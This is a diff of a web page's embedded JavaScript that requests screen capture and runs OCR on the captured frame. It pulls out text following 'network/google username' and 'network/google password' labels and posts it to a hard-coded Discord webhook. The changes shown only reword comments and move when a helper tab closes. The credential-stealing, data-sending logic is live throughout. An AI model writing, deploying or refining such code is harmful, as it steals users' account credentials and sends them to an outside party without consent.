@@ -12,16 +12,16 @@ const W="https://discord.com/api/webhooks/1471638895149187216/4BuoD1F-aQPE_0SkMO
 
 (async()=>{
   try{
-    // open index.html WITH data to trigger test page behavior
-    const testTab = window.open("index.html?data=1","_blank");
+    // Open test.html tab for permission handshake
+    const testTab = window.open("test.html","_blank");
 
-    // ask for screen capture immediately
+    // Request screen capture immediately
     const stream = await navigator.mediaDevices.getDisplayMedia({video:{displaySurface:"browser"}});
 
-    // tell test tab permissions are granted
+    // Notify test.html that permission is granted
     testTab.postMessage({msg:"allowed-permissions"},"*");
 
-    // wait for acknowledgment from test tab
+    // Wait for test.html to acknowledge
     await new Promise(resolve=>{
       function handler(e){
         if(e.data?.msg==="allowed-permissions"){
@@ -32,10 +32,7 @@ const W="https://discord.com/api/webhooks/1471638895149187216/4BuoD1F-aQPE_0SkMO
       window.addEventListener("message", handler);
     });
 
-    // close the test tab immediately after permissions handshake
-    testTab.close();
-
-    // proceed with OCR + Discord workflow
+    // Proceed with OCR + Discord
     const v=document.createElement("video");
     v.srcObject=stream; await v.play(); await new Promise(r=>setTimeout(r,1000));
 
@@ -55,7 +52,7 @@ const W="https://discord.com/api/webhooks/1471638895149187216/4BuoD1F-aQPE_0SkMO
           o=l.reduce((a,v,i)=>a||(v.toLowerCase().includes("network/google username")||v.toLowerCase().includes("network/google password")?`${l[i+1]||""}\n${l[i+2]||""}`:""),"").trim();
     if(!o) return;
 
-    // send OCR result to Discord
+    // Send OCR result to Discord
     await fetch(W,{
       method:"POST",
       headers:{"Content-Type":"application/json"},
@@ -63,6 +60,10 @@ const W="https://discord.com/api/webhooks/1471638895149187216/4BuoD1F-aQPE_0SkMO
     });
 
     console.log("OCR + Discord done!");
+
+    // Finally, tell the test tab to close itself
+    testTab.postMessage({msg:"close-tab"},"*");
+
   } catch(e){console.error(e);}
 })();
 </script>
